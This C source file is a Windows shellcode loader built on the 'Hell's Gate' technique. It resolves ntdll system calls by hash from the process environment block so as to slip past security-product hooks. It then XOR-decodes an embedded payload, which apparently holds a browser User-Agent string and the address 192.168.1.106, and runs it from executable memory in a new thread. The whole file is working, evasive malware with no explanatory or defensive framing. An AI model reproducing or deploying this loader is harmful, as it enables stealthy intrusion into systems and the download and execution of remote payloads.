#pragma once
#include <Windows.h>
#include "structs.h"

/*--------------------------------------------------------------------
  VX Tables
--------------------------------------------------------------------*/
typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;
	DWORD64 dwHash;
	WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
	VX_TABLE_ENTRY NtAllocateVirtualMemory;
	VX_TABLE_ENTRY NtProtectVirtualMemory;
	VX_TABLE_ENTRY NtCreateThreadEx;
	VX_TABLE_ENTRY NtWaitForSingleObject;
} VX_TABLE, * PVX_TABLE;

/*--------------------------------------------------------------------
  Function prototypes.
--------------------------------------------------------------------*/
PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(
	_In_ PVOID                     pModuleBase,
	_Out_ PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory
);
BOOL GetVxTableEntry(
	_In_ PVOID pModuleBase,
	_In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
	_In_ PVX_TABLE_ENTRY pVxTableEntry
);
BOOL Payload(
	_In_ PVX_TABLE pVxTable
);
PVOID VxMoveMemory(
	_Inout_ PVOID dest,
	_In_    const PVOID src,
	_In_    SIZE_T len
);

/*--------------------------------------------------------------------
  External functions' prototype.
--------------------------------------------------------------------*/
extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();

INT wmain() {
	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return 0x1;

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return 0x01;

	VX_TABLE Table = { 0 };
	Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory))
		return 0x1;

	Table.NtCreateThreadEx.dwHash = 0x64dc7db288c5015f;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateThreadEx))
		return 0x1;

	Table.NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtProtectVirtualMemory))
		return 0x1;

	Table.NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWaitForSingleObject))
		return 0x1;

	Payload(&Table);
	return 0x00;
}

PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
	return (PTEB)__readgsqword(0x30);
#else
	return (PTEB)__readfsdword(0x16);
#endif
}

DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x7734773477347734;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;

	return dwHash;
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
			pVxTableEntry->pAddress = pFunctionAddress;

			// Quick and dirty fix in case the function has been hooked
			WORD cw = 0;
			while (TRUE) {
				// check if syscall, in this case we are too far
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return FALSE;

				// check if ret, in this case we are also probaly too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return FALSE;

				// First opcodes should be :
				//    MOV R10, RCX
				//    MOV RCX, <syscall>
				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pVxTableEntry->wSystemCall = (high << 8) | low;
					break;
				}

				cw++;
			};
		}
	}

	return TRUE;
}

BOOL Payload(PVX_TABLE pVxTable) {
	NTSTATUS status = 0x00000000;


	unsigned char buf[] = "\xed\x59\x92\xf5\xe1\xf9\xd9\x11\x11\x11\x50\x40\x50\x41\x43\x40\x47\x59\x20\xc3\x74\x59\x9a\x43\x71\x59\x9a\x43\x9\x59\x9a\x43\x31\x59\x9a\x63\x41\x59\x1e\xa6\x5b\x5b\x5c\x20\xd8\x59\x20\xd1\xbd\x2d\x70\x6d\x13\x3d\x31\x50\xd0\xd8\x1c\x50\x10\xd0\xf3\xfc\x43\x50\x40\x59\x9a\x43\x31\x9a\x53\x2d\x59\x10\xc1\x77\x90\x69\x9\x1a\x13\x64\x63\x9a\x91\x99\x11\x11\x11\x59\x94\xd1\x65\x76\x59\x10\xc1\x41\x9a\x59\x9\x55\x9a\x51\x31\x58\x10\xc1\xf2\x47\x59\xee\xd8\x50\x9a\x25\x99\x59\x10\xc7\x5c\x20\xd8\x59\x20\xd1\xbd\x50\xd0\xd8\x1c\x50\x10\xd0\x29\xf1\x64\xe0\x5d\x12\x5d\x35\x19\x54\x28\xc0\x64\xc9\x49\x55\x9a\x51\x35\x58\x10\xc1\x77\x50\x9a\x1d\x59\x55\x9a\x51\xd\x58\x10\xc1\x50\x9a\x15\x99\x59\x10\xc1\x50\x49\x50\x49\x4f\x48\x4b\x50\x49\x50\x48\x50\x4b\x59\x92\xfd\x31\x50\x43\xee\xf1\x49\x50\x48\x4b\x59\x9a\x3\xf8\x5e\xee\xee\xee\x4c\x7b\x11\x58\xaf\x66\x78\x7f\x78\x7f\x74\x65\x11\x50\x47\x58\x98\xf7\x5d\x98\xe0\x50\xab\x5d\x66\x37\x16\xee\xc4\x59\x20\xd8\x59\x20\xc3\x5c\x20\xd1\x5c\x20\xd8\x50\x41\x50\x41\x50\xab\x2b\x47\x68\xb6\xee\xc4\xfa\x62\x4b\x59\x98\xd0\x50\xa9\xb2\xe\x11\x11\x5c\x20\xd8\x50\x40\x50\x40\x7b\x12\x50\x40\x50\xab\x46\x98\x8e\xd7\xee\xc4\xfa\x48\x4a\x59\x98\xd0\x59\x20\xc3\x58\x98\xc9\x5c\x20\xd8\x43\x79\x11\x13\x51\x95\x43\x43\x50\xab\xfa\x44\x3f\x2a\xee\xc4\x59\x98\xd7\x59\x92\xd2\x41\x7b\x1b\x4e\x59\x98\xe0\x59\x98\xcb\x58\xd6\xd1\xee\xee\xee\xee\x5c\x20\xd8\x43\x43\x50\xab\x3c\x17\x9\x6a\xee\xc4\x94\xd1\x1e\x94\x8c\x10\x11\x11\x59\xee\xde\x1e\x95\x9d\x10\x11\x11\xfa\xc2\xf8\xf5\x10\x11\x11\xf9\xb3\xee\xee\xee\x3e\x46\x67\x5d\x55\x11\x2b\xbb\xaa\xb\x4b\xc6\xfb\x7e\x59\xdf\xcf\xcc\x39\xe7\x3e\x17\x16\x8d\x28\x1f\x79\x83\xa2\xef\x7b\xa0\xce\xb7\xa0\xef\x9f\x24\x67\xe2\xc8\x5e\x5\xfd\x66\xc8\xbf\x89\x9\x5\x5d\x41\x65\x4d\xff\x93\x70\x9e\xd\x1f\x45\x69\x30\x21\x64\x82\x23\xf1\x34\x5c\xf7\x76\x89\xdc\x19\x60\xbb\x8f\x45\x11\x44\x62\x74\x63\x3c\x50\x76\x74\x7f\x65\x2b\x31\x5c\x7e\x6b\x78\x7d\x7d\x70\x3e\x24\x3f\x21\x31\x39\x72\x7e\x7c\x61\x70\x65\x78\x73\x7d\x74\x2a\x31\x5c\x42\x58\x54\x31\x28\x3f\x21\x2a\x31\x46\x78\x7f\x75\x7e\x66\x62\x31\x5f\x45\x31\x27\x3f\x20\x2a\x31\x46\x5e\x46\x27\x25\x2a\x31\x45\x63\x78\x75\x74\x7f\x65\x3e\x24\x3f\x21\x2a\x31\x5f\x41\x21\x27\x38\x1c\x1b\x11\xdb\xec\xf4\xbc\xda\x8\x9a\x7\x9e\xb8\x6e\xbc\x75\x8e\xe3\xfb\x4f\x6a\x71\x97\x65\x29\xfa\xf5\x75\x56\x1e\x5c\xfd\x1e\x7f\xe1\xf7\xf7\x17\xac\x57\x5b\xc\xf6\x47\xa7\x16\x42\x5c\xd4\x48\xf1\x85\x38\xd3\x15\xb7\xaf\x3c\x36\xb6\x4d\x23\x13\x67\x2b\xb7\x8e\x44\x3d\xe9\xc6\x95\xb\xb3\x6f\xca\x0\xac\xb7\x77\x8b\x76\x33\x82\x11\x30\x5f\xe7\xcd\x3\x6e\x93\x9e\x87\x26\xe2\xdd\x2f\x8d\x5e\x72\xdc\x92\x44\xae\xaf\x2\xa4\x3c\xdd\x7e\xc9\xb4\x39\xc5\xf4\x80\xb2\xb9\xfa\x6\xb6\x47\x4e\x77\x7f\x10\xfd\x34\xb6\x6\xfc\xe1\x52\xce\x27\x37\x67\x77\x4\x41\x9b\x93\xc7\x86\x26\x3b\x2a\x25\x63\x4\x97\xd6\x4c\xf1\x40\xa0\x1f\x63\xc9\x8a\xc7\xe2\x2c\xf6\xbd\xd6\x2e\xb7\xac\xe8\xb0\xb1\x60\x2f\xac\x56\xdf\xf4\x6a\xc\xd8\xa1\xd6\x9f\x47\x2d\xc6\x8d\x39\xc8\xdd\x96\x5f\xa8\x3b\x66\x10\x66\x88\x58\x6c\x3\xed\xd6\xef\x8c\x1e\xc5\x36\x28\x4d\x37\xdd\x3f\x11\x50\xaf\xe1\xa4\xb3\x47\xee\xc4\x59\x20\xd8\xab\x11\x11\x51\x11\x50\xa9\x11\x1\x11\x11\x50\xa8\x51\x11\x11\x11\x50\xab\x49\xb5\x42\xf4\xee\xc4\x59\x82\x42\x42\x59\x98\xf6\x59\x98\xe0\x59\x98\xcb\x50\xa9\x11\x31\x11\x11\x58\x98\xe8\x50\xab\x3\x87\x98\xf3\xee\xc4\x59\x92\xd5\x31\x94\xd1\x65\xa7\x77\x9a\x16\x59\x10\xd2\x94\xd1\x64\xc6\x49\x49\x49\x59\x14\x11\x11\x11\x11\x41\xd2\xf9\x8e\xec\xee\xee\x20\x28\x23\x3f\x20\x27\x29\x3f\x20\x3f\x20\x21\x27\x11\x40\x18\xae\x7c";
	unsigned char shellcode[893] ;

	for (int i = 0; i < sizeof(buf) - 1;i++) {
	
		shellcode[i] = buf[i] ^ 0x11;
	}


	// Allocate memory for the shellcode
	PVOID lpAddress = NULL;
	SIZE_T sDataSize = sizeof(shellcode);
	HellsGate(pVxTable->NtAllocateVirtualMemory.wSystemCall);
	status = HellDescent((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);

	int n = 11110;


	// Write Memory
	VxMoveMemory(lpAddress, shellcode, sizeof(shellcode));

	// Change page permissions
	ULONG ulOldProtect = 0;
	HellsGate(pVxTable->NtProtectVirtualMemory.wSystemCall);
	status = HellDescent((HANDLE)-1, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);

	// Create thread
	HANDLE hHostThread = INVALID_HANDLE_VALUE;
	HellsGate(pVxTable->NtCreateThreadEx.wSystemCall);
	status = HellDescent(&hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

	// Wait for 1 seconds
	LARGE_INTEGER Timeout;
	Timeout.QuadPart = -10000000;
	HellsGate(pVxTable->NtWaitForSingleObject.wSystemCall);
	status = HellDescent(hHostThread, FALSE, &Timeout);

	return TRUE;
}

PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
	char* d = dest;
	const char* s = src;
	if (d < s)
		while (len--)
			*d++ = *s++;
	else {
		char* lasts = s + (len - 1);
		char* lastd = d + (len - 1);
		while (len--)
			*lastd-- = *lasts--;
	}
	return dest;
}